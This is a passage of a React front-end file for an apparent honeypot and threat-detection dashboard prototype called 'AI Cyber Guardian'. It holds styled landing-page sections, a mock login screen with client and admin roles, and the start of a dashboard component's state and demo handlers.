                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* ── Core Features Section ── */}
      <div
        id="features"
        style={{
          position: "relative",
          zIndex: 2,
          maxWidth: 1200,
          margin: "90px auto",
          padding: "0 24px",
        }}
      >
        <div style={{ textAlign: "center", marginBottom: 54 }}>
          <div
            style={{
              fontFamily: "'Inter', sans-serif",
              color: "#ef4444",
              fontWeight: 800,
              fontSize: 12,
              letterSpacing: "2.5px",
              marginBottom: 10,
            }}
          >
            ENTERPRISE THREAT MITIGATION
          </div>
          <h2
            style={{
              fontSize: "clamp(28px, 4vw, 42px)",
              fontWeight: 900,
              color: "#ffffff",
              fontFamily: "'Inter', sans-serif",
              letterSpacing: "1px",
              margin: 0,
            }}
          >
            Built for High-Throughput Gateways
          </h2>
          <p style={{ color: "rgba(255, 255, 255, 0.7)", fontSize: 15, marginTop: 12, maxWidth: 640, margin: "12px auto 0" }}>
            Deterministic rule speed meets statistical machine learning depth without adding latency to the transaction path.
          </p>
        </div>

        {/* 6 Cyberpunk Feature Cards */}
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(350px, 1fr))", gap: 26 }}>
          {features.map((f) => (
            <div
              key={f.title}
              style={{
                borderRadius: 24,
                padding: "34px 30px",
                background: "rgba(12, 18, 36, 0.65)",
                border: "1px solid rgba(0, 240, 255, 0.25)",
                backdropFilter: "blur(24px) saturate(180%)",
                WebkitBackdropFilter: "blur(24px) saturate(180%)",
                boxShadow: "0 15px 35px rgba(0, 0, 0, 0.5), inset 0 0 15px rgba(0, 240, 255, 0.05)",
                transition: "all 0.3s ease",
                cursor: "pointer",
                position: "relative",
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.transform = "translateY(-6px)";
                e.currentTarget.style.borderColor = f.color;
                e.currentTarget.style.boxShadow = `0 25px 50px rgba(0,0,0,0.8), 0 0 30px ${f.color}55`;
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.transform = "translateY(0)";
                e.currentTarget.style.borderColor = "rgba(0, 240, 255, 0.25)";
                e.currentTarget.style.boxShadow = "0 15px 35px rgba(0, 0, 0, 0.5), inset 0 0 15px rgba(0, 240, 255, 0.05)";
              }}
            >
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 20 }}>
                <div
                  style={{
                    width: 48,
                    height: 48,
                    borderRadius: 14,
                    background: f.accent,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    border: `1px solid ${f.color}55`,
                    boxShadow: `0 0 16px ${f.color}33`,
                  }}
                >
                  {f.icon}
                </div>
                <span
                  style={{
                    fontSize: 10,
                    fontWeight: 800,
                    fontFamily: "'Inter', sans-serif",
                    letterSpacing: "1.2px",
                    color: f.color,
                    padding: "4px 10px",
                    borderRadius: 14,
                    background: `${f.color}15`,
                    border: `1px solid ${f.color}44`,
                  }}
                >
                  {f.badge}
                </span>
              </div>
              <h3
                style={{
                  fontSize: 19,
                  fontWeight: 800,
                  color: "#ffffff",
                  fontFamily: "'Inter', sans-serif",
                  marginBottom: 12,
                  letterSpacing: "0.5px",
                }}
              >
                {f.title}
              </h3>
              <p style={{ color: "rgba(255, 255, 255, 0.72)", fontSize: 13, lineHeight: 1.7, margin: 0 }}>
                {f.desc}
              </p>
            </div>
          ))}
        </div>
      </div>

      {/* ── Interactive 3-Stage Deception Flow ── */}
      <div
        style={{
          position: "relative",
          zIndex: 2,
          maxWidth: 1200,
          margin: "90px auto",
          padding: "44px 34px",
          borderRadius: 28,
          background: "rgba(10, 16, 32, 0.72)",
          border: "1px solid rgba(0, 240, 255, 0.35)",
          backdropFilter: "blur(26px)",
          boxShadow: "0 25px 65px rgba(0, 0, 0, 0.75), 0 0 35px rgba(0, 240, 255, 0.18)",
        }}
      >
        <div style={{ textAlign: "center", marginBottom: 40 }}>
          <span style={{ color: "#22c55e", fontFamily: "'Inter', sans-serif", fontSize: 12, fontWeight: 800, letterSpacing: "2.5px" }}>
            HOW DECEPTION WORKS
          </span>
          <h2 style={{ fontSize: "clamp(26px, 3.5vw, 34px)", fontWeight: 900, color: "#ffffff", fontFamily: "'Inter', sans-serif", margin: "10px 0" }}>
            From Ingress Attack to In-Memory Honeypot
          </h2>
        </div>

        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(290px, 1fr))", gap: 24 }}>
          {[
            {
              step: "01",
              title: "80-D Ingress Extraction",
              text: "HTTP parameters, headers, and body are canonicalized. Shannon entropy & 64 character n-gram frequencies extracted in 0.85ms.",
              tag: "INLINE FILTER",
              color: "#38bdf8"
            },
            {
              step: "02",
              title: "Adaptive Confidence Fusion",
              text: "Isolation Forest outlier score and Random Forest class probabilities are dynamically blended against deterministic signatures.",
              tag: "DECISION MATRIX",
              color: "#a855f7"
            },
            {
              step: "03",
              title: "In-Memory Linux Sandbox",
              text: "Instead of a 403 error, malicious sessions quietly divert to a fake virtual filesystem. Attackers fuzz decoy keys while telemetry is logged.",
              tag: "ZERO ESCAPE VFS",
              color: "#ef4444"
            }
          ].map((s) => (
            <div
              key={s.step}
              style={{
                background: "rgba(255, 255, 255, 0.04)",
                border: "1px solid rgba(255, 255, 255, 0.12)",
                borderRadius: 22,
                padding: "28px 24px",
                position: "relative",
              }}
            >
              <div
                style={{
                  fontSize: 32,
                  fontWeight: 900,
                  fontFamily: "'Inter', sans-serif",
                  color: s.color,
                  marginBottom: 12,
                  
                }}
              >
                {s.step}
              </div>
              <div style={{ fontSize: 16, fontWeight: 800, color: "#ffffff", marginBottom: 10, fontFamily: "'Inter', sans-serif" }}>
                {s.title}
              </div>
              <p style={{ color: "rgba(255, 255, 255, 0.7)", fontSize: 13, lineHeight: 1.65, margin: 0 }}>
                {s.text}
              </p>
            </div>
          ))}
        </div>
      </div>

      {/* ── Interactive FAQ Section ── */}
      <div
        id="faq"
        style={{
          position: "relative",
          zIndex: 2,
          maxWidth: 960,
          margin: "90px auto",
          padding: "0 24px",
        }}
      >
        <div style={{ textAlign: "center", marginBottom: 44 }}>
          <span style={{ color: "#38bdf8", fontFamily: "'Inter', sans-serif", fontSize: 11, fontWeight: 800, letterSpacing: "2px" }}>
            FREQUENTLY ASKED QUESTIONS
          </span>
          <h2 style={{ fontSize: "clamp(26px, 3.5vw, 36px)", fontWeight: 900, color: "#ffffff", fontFamily: "'Inter', sans-serif", margin: "10px 0" }}>
            Engine Architecture & Deployment
          </h2>
        </div>

        <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
          {faqs.map((faq, idx) => {
            const isOpen = openFaq === idx;
            return (
              <div
                key={faq.q}
                style={{
                  borderRadius: 18,
                  background: isOpen ? "rgba(12, 18, 38, 0.85)" : "rgba(10, 15, 28, 0.55)",
                  border: isOpen ? "1px solid #38bdf8" : "1px solid rgba(255, 255, 255, 0.12)",
                  boxShadow: isOpen ? "0 0 25px rgba(0, 240, 255, 0.2)" : "none",
                  overflow: "hidden",
                  transition: "all 0.25s ease",
                }}
              >
                <div
                  onClick={() => {
                    playClickSound();
                    setOpenFaq(isOpen ? null : idx);
                  }}
                  style={{
                    padding: "20px 24px",
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    cursor: "pointer",
                  }}
                >
                  <span
                    style={{
                      fontFamily: "'Inter', sans-serif",
                      fontWeight: 800,
                      fontSize: 15,
                      color: isOpen ? "#38bdf8" : "#ffffff",
                    }}
                  >
                    {faq.q}
                  </span>
                  <span style={{ fontSize: 18, color: isOpen ? "#38bdf8" : "rgba(255, 255, 255, 0.5)", fontWeight: 900 }}>
                    {isOpen ? "−" : "+"}
                  </span>
                </div>
                {isOpen && (
                  <div
                    style={{
                      padding: "0 24px 22px",
                      color: "rgba(255, 255, 255, 0.78)",
                      fontSize: 13,
                      lineHeight: 1.7,
                      borderTop: "1px solid rgba(255, 255, 255, 0.08)",
                      paddingTop: 16,
                    }}
                  >
                    {faq.a}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>

      {/* ── Cyberpunk Footer ── */}
      <footer
        style={{
          position: "relative",
          zIndex: 2,
          borderTop: "1px solid rgba(0, 240, 255, 0.25)",
          padding: "36px 40px",
          background: "rgba(5, 8, 18, 0.94)",
          backdropFilter: "blur(24px)",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          flexWrap: "wrap",
          gap: 20,
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <span style={{ fontSize: 20 }}>🛡️</span>
          <div>
            <span
              style={{
                fontFamily: "'Inter', sans-serif",
                fontWeight: 900,
                fontSize: 14,
                color: "#38bdf8",
                letterSpacing: "1.2px",
              }}
            >
              AI CYBER GUARDIAN © 2026–2027
            </span>
            <div style={{ fontSize: 10, color: "rgba(255, 255, 255, 0.5)", fontFamily: "'Fira Code', monospace" }}>
              RESEARCH PROTOTYPE & SOC PRODUCTION PLATFORM
            </div>
          </div>
        </div>
        <div style={{ display: "flex", gap: 24, fontSize: 12, color: "rgba(255, 255, 255, 0.7)", fontFamily: "'Fira Code', monospace" }}>
          <span style={{ cursor: "pointer", transition: "color 0.2s" }} onClick={() => { playClickSound(); onNav("login"); }}>
            PORTAL LOGIN
          </span>
          <span style={{ cursor: "pointer", transition: "color 0.2s" }} onClick={() => { playClickSound(); onNav("dashboard"); }}>
            SOC TELEMETRY
          </span>
          <span style={{ cursor: "pointer", transition: "color 0.2s" }} onClick={() => { playClickSound(); onNav("admin"); }}>
            SUPER ADMIN
          </span>
          <span style={{ color: "#22c55e", fontWeight: 700 }}>STIX 2.1 COMPLIANT</span>
        </div>
      </footer>
    </div>
  );
}


// ── Screen: Login ──────────────────────────────────────────────────────────
function Login({ onNav }) {
  const [role, setRole] = useState("client"); // "client" | "admin"
  const [email, setEmail] = useState("client@example.com");
  const [pass, setPass] = useState("••••••••••");
  const [loading, setLoading] = useState(false);
  const [focusedField, setFocusedField] = useState(null);

  function selectRole(r) {
    setRole(r);
    if (r === "admin") {
      setEmail("admin@cyberguardian.ai");
    } else {
      setEmail("client@example.com");
    }
  }

  function submit() {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      if (role === "admin" || email.includes("admin")) {
        onNav("admin");
      } else {
        onNav("dashboard");
      }
    }, 600);
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        position: "relative",
        backgroundImage: `radial-gradient(ellipse at 50% 25%, rgba(0, 240, 255, 0.08) 0%, rgba(9, 13, 26, 0.78) 55%, rgba(5, 7, 15, 0.94) 100%), url(${cyberpunkBg})`,
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundAttachment: "fixed",
        overflowX: "hidden",
      }}
    >
      {/* Cyberpunk Scanline & Ambient Grid Overlay */}
      <div
        style={{
          position: "absolute",
          inset: 0,
          pointerEvents: "none",
          backgroundImage:
            "linear-gradient(rgba(0, 240, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 240, 255, 0.03) 1px, transparent 1px)",
          backgroundSize: "40px 40px",
          zIndex: 1,
        }}
      />

      {/* Cyberpunk Top Bar */}
      <nav
        style={{
          position: "relative",
          zIndex: 2,
          padding: "18px 40px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          backdropFilter: "blur(12px)",
          borderBottom: "1px solid rgba(0, 240, 255, 0.18)",
          background: "rgba(5, 9, 20, 0.45)",
        }}
      >
        <div
          style={{ display: "flex", alignItems: "center", gap: 10, cursor: "pointer" }}
          onClick={() => onNav("landing")}
        >
          <div
            style={{
              width: 32,
              height: 32,
              borderRadius: "50%",
              background: "rgba(0, 240, 255, 0.15)",
              border: "1px solid #00f0ff",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              boxShadow: "0 0 15px rgba(0, 240, 255, 0.4)",
            }}
          >
            <span style={{ fontSize: 16 }}>🛡️</span>
          </div>
          <span
            style={{
              fontFamily: "'Orbitron', 'Rajdhani', monospace, sans-serif",
              fontWeight: 800,
              fontSize: 16,
              letterSpacing: "1.5px",
              color: "#00f0ff",
              textShadow: "0 0 10px rgba(0, 240, 255, 0.6)",
            }}
          >
            AI CYBER GUARDIAN
          </span>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
          <span
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: 6,
              fontSize: 11,
              fontFamily: "monospace",
              color: "#39ff14",
              background: "rgba(57, 255, 20, 0.1)",
              padding: "4px 10px",
              borderRadius: 20,
              border: "1px solid rgba(57, 255, 20, 0.3)",
            }}
          >
            <span
              style={{
                width: 6,
                height: 6,
                borderRadius: "50%",
                background: "#39ff14",
                boxShadow: "0 0 8px #39ff14",
              }}
            />
            QUANTUM-DECEPTION ONLINE
          </span>
          <span
            style={{
              color: "rgba(255, 255, 255, 0.7)",
              fontSize: 12,
              cursor: "pointer",
              fontFamily: "monospace",
              transition: "all 0.2s",
            }}
            onClick={() => onNav("landing")}
            onMouseEnter={(e) => (e.currentTarget.style.color = "#00f0ff")}
            onMouseLeave={(e) => (e.currentTarget.style.color = "rgba(255, 255, 255, 0.7)")}
          >
            ← BACK TO HOME
          </span>
        </div>
      </nav>

      {/* Main Glassmorphic Transparent Container */}
      <div
        style={{
          position: "relative",
          zIndex: 2,
          flex: 1,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          padding: "36px 20px",
        }}
      >
        <div
          style={{
            width: "100%",
            maxWidth: 420,
            padding: "40px 36px 36px",
            borderRadius: 28,
            backdropFilter: "blur(24px) saturate(180%)",
            WebkitBackdropFilter: "blur(24px) saturate(180%)",
            background: "rgba(12, 18, 32, 0.52)",
            border: "1px solid rgba(0, 240, 255, 0.38)",
            boxShadow:
              "0 24px 60px rgba(0, 0, 0, 0.75), 0 0 35px rgba(0, 240, 255, 0.22), inset 0 0 20px rgba(255, 0, 128, 0.14)",
            position: "relative",
            transition: "all 0.3s ease",
          }}
        >
          {/* Subtle Glowing Cyan Top Accent */}
          <div
            style={{
              position: "absolute",
              top: 0,
              left: "20%",
              right: "20%",
              height: 2,
              background: "linear-gradient(90deg, transparent, #00f0ff, #ff007f, transparent)",
              boxShadow: "0 0 12px #00f0ff",
            }}
          />

          {/* Header Title: LOGIN */}
          <div style={{ textAlign: "center", marginBottom: 28 }}>
            <h1
              style={{
                margin: 0,
                fontSize: 34,
                fontWeight: 900,
                letterSpacing: "4px",
                fontFamily: "'Orbitron', 'Rajdhani', monospace, sans-serif",
                color: "#ffffff",
                textShadow:
                  "0 0 10px rgba(0, 240, 255, 0.9), 0 0 22px rgba(0, 240, 255, 0.6), 0 0 36px rgba(255, 0, 128, 0.35)",
              }}
            >
              LOGIN
            </h1>
            <p
              style={{
                color: "rgba(0, 240, 255, 0.7)",
                fontSize: 12,
                marginTop: 6,
                fontFamily: "monospace",
                letterSpacing: "1px",
              }}
            >
              SECURE DECEPTION & THREAT FUSION PORTAL
            </p>
          </div>

          {/* Role Switcher Pill */}
          <div
            style={{
              display: "grid",
              gridTemplateColumns: "1fr 1fr",
              gap: 6,
              marginBottom: 24,
              background: "rgba(0, 0, 0, 0.35)",
              padding: 4,
              borderRadius: 24,
              border: "1px solid rgba(0, 240, 255, 0.22)",
            }}
          >
            <button
              type="button"
              onClick={() => selectRole("client")}
              style={{
                background:
                  role === "client"
                    ? "linear-gradient(135deg, rgba(0, 240, 255, 0.4), rgba(0, 150, 255, 0.4))"
                    : "transparent",
                color: role === "client" ? "#00f0ff" : "rgba(255, 255, 255, 0.55)",
                border: role === "client" ? "1px solid #00f0ff" : "1px solid transparent",
                borderRadius: 20,
                padding: "8px 12px",
                fontSize: 11,
                fontWeight: 800,
                letterSpacing: "1px",
                cursor: "pointer",
                transition: "all 0.2s",
                boxShadow: role === "client" ? "0 0 12px rgba(0, 240, 255, 0.3)" : "none",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 6,
              }}
            >
              <span>🛡️</span> CLIENT SOC
            </button>
            <button
              type="button"
              onClick={() => selectRole("admin")}
              style={{
                background:
                  role === "admin"
                    ? "linear-gradient(135deg, rgba(255, 0, 128, 0.45), rgba(168, 85, 247, 0.45))"
                    : "transparent",
                color: role === "admin" ? "#ff007f" : "rgba(255, 255, 255, 0.55)",
                border: role === "admin" ? "1px solid #ff007f" : "1px solid transparent",
                borderRadius: 20,
                padding: "8px 12px",
                fontSize: 11,
                fontWeight: 800,
                letterSpacing: "1px",
                cursor: "pointer",
                transition: "all 0.2s",
                boxShadow: role === "admin" ? "0 0 12px rgba(255, 0, 128, 0.4)" : "none",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 6,
              }}
            >
              <span>👑</span> SUPER ADMIN
            </button>
          </div>

          {/* Form Fields: Email or username */}
          <div style={{ marginBottom: 16 }}>
            <div
              style={{
                position: "relative",
                display: "flex",
                alignItems: "center",
                background: "rgba(255, 255, 255, 0.07)",
                border:
                  focusedField === "email"
                    ? "1px solid #00f0ff"
                    : "1px solid rgba(0, 240, 255, 0.32)",
                borderRadius: 24,
                backdropFilter: "blur(12px)",
                boxShadow:
                  focusedField === "email"
                    ? "0 0 15px rgba(0, 240, 255, 0.35), inset 0 2px 4px rgba(0,0,0,0.5)"
                    : "inset 0 2px 4px rgba(0,0,0,0.4)",
                transition: "all 0.2s ease",
              }}
            >
              <span
                style={{
                  position: "absolute",
                  left: 16,
                  color: focusedField === "email" ? "#00f0ff" : "rgba(0, 240, 255, 0.7)",
                  fontSize: 14,
                }}
              >
                👤
              </span>
              <input
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onFocus={() => setFocusedField("email")}
                onBlur={() => setFocusedField(null)}
                placeholder="Email or username"
                style={{
                  width: "100%",
                  background: "transparent",
                  border: "none",
                  color: "#ffffff",
                  padding: "12px 18px 12px 42px",
                  fontSize: 13,
                  fontFamily: "inherit",
                  outline: "none",
                  letterSpacing: "0.5px",
                }}
              />
            </div>
          </div>

          {/* Form Fields: Password */}
          <div style={{ marginBottom: 12 }}>
            <div
              style={{
                position: "relative",
                display: "flex",
                alignItems: "center",
                background: "rgba(255, 255, 255, 0.07)",
                border:
                  focusedField === "pass"
                    ? "1px solid #00f0ff"
                    : "1px solid rgba(0, 240, 255, 0.32)",
                borderRadius: 24,
                backdropFilter: "blur(12px)",
                boxShadow:
                  focusedField === "pass"
                    ? "0 0 15px rgba(0, 240, 255, 0.35), inset 0 2px 4px rgba(0,0,0,0.5)"
                    : "inset 0 2px 4px rgba(0,0,0,0.4)",
                transition: "all 0.2s ease",
              }}
            >
              <span
                style={{
                  position: "absolute",
                  left: 16,
                  color: focusedField === "pass" ? "#00f0ff" : "rgba(0, 240, 255, 0.7)",
                  fontSize: 14,
                }}
              >
                🔒
              </span>
              <input
                value={pass}
                onChange={(e) => setPass(e.target.value)}
                onFocus={() => setFocusedField("pass")}
                onBlur={() => setFocusedField(null)}
                type="password"
                placeholder="Password"
                style={{
                  width: "100%",
                  background: "transparent",
                  border: "none",
                  color: "#ffffff",
                  padding: "12px 18px 12px 42px",
                  fontSize: 13,
                  fontFamily: "inherit",
                  outline: "none",
                  letterSpacing: "1px",
                }}
              />
            </div>
          </div>

          {/* Forgot Password Link */}
          <div style={{ textAlign: "right", marginBottom: 20 }}>
            <span
              style={{
                color: "#00f0ff",
                fontSize: 12,
                cursor: "pointer",
                fontFamily: "inherit",
                textShadow: "0 0 8px rgba(0, 240, 255, 0.6)",
                transition: "opacity 0.2s",
              }}
              onMouseEnter={(e) => (e.currentTarget.style.opacity = "0.75")}
              onMouseLeave={(e) => (e.currentTarget.style.opacity = "1")}
            >
              Forgot password?
            </span>
          </div>

          {/* Primary Submit Button */}
          <button
            onClick={submit}
            style={{
              width: "100%",
              padding: "13px",
              background: loading
                ? "rgba(255, 255, 255, 0.1)"
                : role === "admin"
                ? "linear-gradient(90deg, #ff007f 0%, #a855f7 100%)"
                : "linear-gradient(90deg, #00f0ff 0%, #0099ff 50%, #ff007f 100%)",
              color: loading ? "rgba(255, 255, 255, 0.5)" : "#070b14",
              border: "none",
              borderRadius: 24,
              fontSize: 13,
              fontWeight: 900,
              letterSpacing: "2px",
              cursor: loading ? "not-allowed" : "pointer",
              fontFamily: "'Orbitron', monospace, sans-serif",
              transition: "all 0.25s ease",
              boxShadow:
                role === "admin"
                  ? "0 0 24px rgba(255, 0, 128, 0.6), 0 0 45px rgba(255, 0, 128, 0.25)"
                  : "0 0 24px rgba(0, 240, 255, 0.6), 0 0 45px rgba(0, 240, 255, 0.25)",
            }}
          >
            {loading ? "INITIALIZING SECURE SESSION..." : role === "admin" ? "ACCESS CONTROL PLANE →" : "AUTHENTICATE →"}
          </button>

          {/* OR Divider with Neon Lines */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: 12,
              margin: "24px 0 20px",
            }}
          >
            <div
              style={{
                height: 1,
                flex: 1,
                background: "linear-gradient(to right, transparent, rgba(0, 240, 255, 0.7))",
              }}
            />
            <span
              style={{
                color: "rgba(0, 240, 255, 0.85)",
                fontSize: 12,
                fontWeight: 800,
                letterSpacing: "2px",
                fontFamily: "monospace",
              }}
            >
              OR
            </span>
            <div
              style={{
                height: 1,
                flex: 1,
                background: "linear-gradient(to left, transparent, rgba(0, 240, 255, 0.7))",
              }}
            />
          </div>

          {/* Social / Neural Auth Icons (Google, GitHub, X) */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 16,
              marginBottom: 20,
            }}
          >
            {/* Google */}
            <div
              style={{
                width: 44,
                height: 44,
                borderRadius: "50%",
                background: "rgba(255, 255, 255, 0.08)",
                border: "1px solid rgba(0, 240, 255, 0.35)",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer",
                boxShadow: "0 0 14px rgba(0, 240, 255, 0.2)",
                transition: "all 0.2s ease",
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.transform = "scale(1.08)";
                e.currentTarget.style.boxShadow = "0 0 20px rgba(0, 240, 255, 0.6)";
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.transform = "scale(1)";
                e.currentTarget.style.boxShadow = "0 0 14px rgba(0, 240, 255, 0.2)";
              }}
              title="Authenticate with Google"
            >
              <svg width="20" height="20" viewBox="0 0 24 24">
                <path
                  fill="#4285F4"
                  d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                />
                <path
                  fill="#34A853"
                  d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                />
                <path
                  fill="#FBBC05"
                  d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"
                />
                <path
                  fill="#EA4335"
                  d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"
                />
              </svg>
            </div>

            {/* GitHub */}
            <div
              style={{
                width: 44,
                height: 44,
                borderRadius: "50%",
                background: "rgba(255, 255, 255, 0.08)",
                border: "1px solid rgba(0, 240, 255, 0.35)",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer",
                boxShadow: "0 0 14px rgba(0, 240, 255, 0.2)",
                transition: "all 0.2s ease",
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.transform = "scale(1.08)";
                e.currentTarget.style.boxShadow = "0 0 20px rgba(0, 240, 255, 0.6)";
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.transform = "scale(1)";
                e.currentTarget.style.boxShadow = "0 0 14px rgba(0, 240, 255, 0.2)";
              }}
              title="Authenticate with GitHub"
            >
              <svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff">
                <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z" />
              </svg>
            </div>

            {/* X / Twitter */}
            <div
              style={{
                width: 44,
                height: 44,
                borderRadius: "50%",
                background: "rgba(255, 255, 255, 0.08)",
                border: "1px solid rgba(0, 240, 255, 0.35)",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "pointer",
                boxShadow: "0 0 14px rgba(0, 240, 255, 0.2)",
                transition: "all 0.2s ease",
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.transform = "scale(1.08)";
                e.currentTarget.style.boxShadow = "0 0 20px rgba(0, 240, 255, 0.6)";
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.transform = "scale(1)";
                e.currentTarget.style.boxShadow = "0 0 14px rgba(0, 240, 255, 0.2)";
              }}
              title="Authenticate with X"
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="#00f0ff">
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
              </svg>
            </div>
          </div>

          {/* Footer note */}
          <p
            style={{
              textAlign: "center",
              color: "rgba(255, 255, 255, 0.45)",
              fontSize: 11,
              marginTop: 18,
              fontFamily: "monospace",
              letterSpacing: "0.5px",
            }}
          >
            {role === "admin" ? (
              <span style={{ color: "#ff007f" }}>⚡ ROOT PERIMETER GUARD • ZERO ESCAPE HONEYPOT ACTIVE</span>
            ) : (
              <>
                New enterprise tenant?{" "}
                <span
                  style={{ color: "#00f0ff", cursor: "pointer", textDecoration: "underline" }}
                  onClick={() => selectRole("admin")}
                >
                  Request Provisioning
                </span>
              </>
            )}
          </p>
        </div>
      </div>
    </div>
  );
}

// ── Screen: Dashboard ──────────────────────────────────────────────────────
function Dashboard({ onNav, onOpenAttacker }) {
  const [activeNav, setActiveNav] = useState("overview");
  const [events, setEvents] = useState(INITIAL_EVENTS);
  const [blockedList, setBlockedList] = useState(INITIAL_BLOCKED);
  const [honeypotSessions, setHoneypotSessions] = useState(INITIAL_HONEYPOT_SESSIONS);
  const [attackers, setAttackers] = useState(INITIAL_ATTACKERS);
  const [sites, setSites] = useState(INITIAL_SITES);
  const [newId, setNewId] = useState(null);
  const [backendOnline, setBackendOnline] = useState(false);

  // Modals & UI States
  const [addSiteModal, setAddSiteModal] = useState(false);
  const [blockIPModal, setBlockIPModal] = useState(false);
  const [terminalReplaySession, setTerminalReplaySession] = useState(null);
  const [expandedSessionId, setExpandedSessionId] = useState("hp-901");
  const [reportSuccessModal, setReportSuccessModal] = useState(false);

  // Search & Filter inputs
  const [searchFilter, setSearchFilter] = useState("");
  const [severityFilter, setSeverityFilter] = useState("ALL");
  const [attackerSearch, setAttackerSearch] = useState("");
  const [expandedEventId, setExpandedEventId] = useState(null);

  // New Site Form
  const [newSiteName, setNewSiteName] = useState("");
  const [newSiteUrl, setNewSiteUrl] = useState("");

  // New Block Form
  const [newBlockIP, setNewBlockIP] = useState("");
  const [newBlockReason, setNewBlockReason] = useState("");
  const [newBlockDuration, setNewBlockDuration] = useState("Permanent");

  // Settings state
  const [showApiKey, setShowApiKey] = useState(false);
  const [apiKey, setApiKey] = useState("gk_live_94fa2014b281cc9381e0029b");
  const [notifySettings, setNotifySettings] = useState({
    emailAlerts: true,
    criticalOnly: true,
    weeklyDigest: true,
  });
  const [soundEnabled, setSoundEnabled] = useState(getSoundState());
  const [demoActive, setDemoActive] = useState(false);
  const [demoStage, setDemoStage] = useState(null);
  const [isDownloadingPdf, setIsDownloadingPdf] = useState(false);
  const [settingsOpen, setSettingsOpen] = useState(false);
  const [gridVisible, setGridVisible] = useState(false);
  const [theme, setTheme] = useState("emotion");
  const [mlMeta, setMlMeta] = useState(null);

  useEffect(() => {
    applySoundState(soundEnabled);
  }, [soundEnabled]);

  useEffect(() => {
    document.documentElement.setAttribute("data-theme", theme);
  }, [theme]);

  // Check backend health and live ML model status periodically
  useEffect(() => {
    const updateHealth = () => {
      checkBackendHealth().then(setBackendOnline);
      fetchMLStatus().then((data) => {
        if (data && data.benchmark) {
          setMlMeta(data.benchmark);
        }
      });
    };
    updateHealth();
    const h = setInterval(updateHealth, 15000);
    return () => clearInterval(h);
  }, []);

  // Handlers for 1-Click Interactive Attack Demo
  const handleRunDemo = async () => {
    if (demoActive) return;
    setDemoActive(true);
    try {
      const res = await fetch("http://localhost:8000/api/v1/demo/run-scenario", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ mode: "standard" }),
      });
      if (!res.ok) {
        _runFallbackDemo();
      }
    } catch (e) {
      _runFallbackDemo();
    }
  };

  const handleStopDemo = async () => {
    setDemoActive(false);
    setDemoStage(null);
    try {
